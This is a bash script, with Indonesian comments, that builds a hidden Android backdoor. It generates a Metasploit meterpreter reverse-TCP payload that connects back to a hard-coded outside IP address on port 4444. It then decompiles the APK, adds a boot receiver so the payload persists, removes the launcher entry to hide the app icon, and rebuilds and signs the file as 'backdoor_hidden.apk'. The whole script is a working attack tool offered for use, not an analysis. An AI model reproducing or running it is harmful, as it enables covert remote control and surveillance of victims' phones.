#!/bin/bash

IP="8.215.192.205"
PORT="4444"
PAYLOAD_NAME="backdoor.apk"
OUT_DIR="backdoor_src"
KEYSTORE="my-release-key.jks"
SIGNED_APK="backdoor_hidden.apk"

# Step 1: Buat payload APK
echo "[*] Membuat payload APK..."
msfvenom -p android/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -o $PAYLOAD_NAME

# Step 2: Decompile APK
echo "[*] Mendekompilasi APK..."
apktool d $PAYLOAD_NAME -o $OUT_DIR

# Step 3: Edit AndroidManifest.xml
echo "[*] Menyisipkan receiver auto-start & sembunyikan ikon..."
MANIFEST="$OUT_DIR/AndroidManifest.xml"

# Tambahkan permission BOOT
sed -i '/<uses-permission android:name="android.permission.INTERNET" \/>/a <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />' $MANIFEST

# Tambahkan receiver sebelum </application>
sed -i '/<\/application>/i \
<receiver android:name=".BootReceiver" android:enabled="true" android:exported="true">\n\
<intent-filter>\n\
<action android:name="android.intent.action.BOOT_COMPLETED" />\n\
</intent-filter>\n\
</receiver>' $MANIFEST

# Hilangkan ikon: hapus intent-filter launcher
sed -i '/<intent-filter>/,/<\/intent-filter>/d' $MANIFEST

# Step 4: Tambah file smali receiver
RECEIVER_PATH="$OUT_DIR/smali/com/metasploit/stage/BootReceiver.smali"
cat > $RECEIVER_PATH <<EOF
.class public Lcom/metasploit/stage/BootReceiver;
.super Landroid/content/BroadcastReceiver;

.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V
    return-void
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 1
    new-instance v0, Landroid/content/Intent;
    invoke-direct {v0, p1, Lcom/metasploit/stage/MainService;}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    return-void
.end method
EOF

# Step 5: Rebuild APK
echo "[*] Rebuild APK..."
apktool b $OUT_DIR -o backdoor_mod.apk

# Step 6: Buat keystore jika belum ada
if [ ! -f "$KEYSTORE" ]; then
    echo "[*] Membuat keystore..."
    keytool -genkey -v -keystore $KEYSTORE -alias myalias -keyalg RSA -keysize 2048 -validity 10000 -storepass android -keypass android -dname "CN=HiddenApp,O=Backdoor,C=ID"
fi

# Step 7: Sign APK
echo "[*] Menandatangani APK..."
apksigner sign --ks $KEYSTORE --ks-pass pass:android --key-pass pass:android --out $SIGNED_APK backdoor_mod.apk

echo "[+] Selesai! File APK backdoor tersembunyi: $SIGNED_APK"
